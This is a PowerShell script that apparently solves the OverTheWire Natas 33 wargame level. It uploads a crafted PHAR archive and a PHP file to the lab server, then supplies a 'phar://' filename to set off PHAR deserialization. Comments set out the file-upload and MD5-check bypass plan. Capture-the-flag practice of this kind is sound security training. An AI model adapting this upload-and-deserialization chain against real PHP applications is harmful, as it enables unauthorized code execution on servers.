using namespace Microsoft.PowerShell.Utility

$server = "natas33.natas.labs.overthewire.org"
#$server = "localhost:8000"
$url = "http://$server"

$username = "natas33"
$password = "***REMOVED***"

$pair = "${username}:${password}"
$bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
$base64 = [System.Convert]::ToBase64String($bytes)
$authorization = "Basic $base64"

$boundary = [System.Guid]::NewGuid().ToString()

$headers = @{
    "Authorization" = $authorization
    "Content-Type"  = "multipart/form-data"
}

$filename = 'mylittle.phar'
$formFields = @{
    uploadedfile = Get-Item -Path 'test.phar'
    filename = $filename
}

$response = Invoke-WebRequest -Headers $headers -URI $url -Method Post -Form $formFields -SessionVariable sessVar
#The update has been uploaded to: /natas33/upload/mylittle.phar

$filename = "upload1.php"
$formFields = @{
    uploadedfile = Get-Item -Path 'upload1.php'
    filename = $filename
}

$response = Invoke-WebRequest -Headers $headers -URI $url -Method Post -Form $formFields -WebSession $sessVar
#The update has been uploaded to: /natas33/upload/upload1.php


$filename = "phar://mylittle.phar/test.txt"
$formFields = @{
    uploadedfile = Get-Item -Path 'test.txt'
    filename = $filename
}

$response = Invoke-WebRequest -Headers $headers -URI $url -Method Post -Form $formFields -WebSession $sessVar
#big boom!
$content = $response.Content.Split('<form enctype')
$content = $content[0].Split('<body>')[1]
$content = $content.Replace("<br>", "`n")

$msg = $content

<#
$url = $url + '/natas33/upload/myownlittleindex.php'
$response = Invoke-WebRequest -Headers $headers -URI $url -WebSession $sessVar
$msg = $response
#>


$msg = $msg.Replace("<br>", "`n");
#write-host `n$msg`n
write-host `n($response.RawContent)`n
<#
Goal: 

1) Pass Check: Uploaded File is SMALLER than 4096 bytes (should be easy)

2) File is then copied from tmp-upload-dir to:
            $this->filename=$_POST["filename"]
            $_POST["filename"] = <input name="filename" value="<?php echo session_id(); ?>" />

                                                                this is the full path of /natas33/upload
            if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], "/natas33/upload/" . $this->filename)) {

    Location of our uploaded file: /natas33/upload/sessionid

3) Match MD5 sum of $signature='adeafbadbabec0dedabada55ba55d00d';

if(md5_file($this->filename) == $this->signature){



if there is a valid "patch-file" on that server, i know the answer?

#>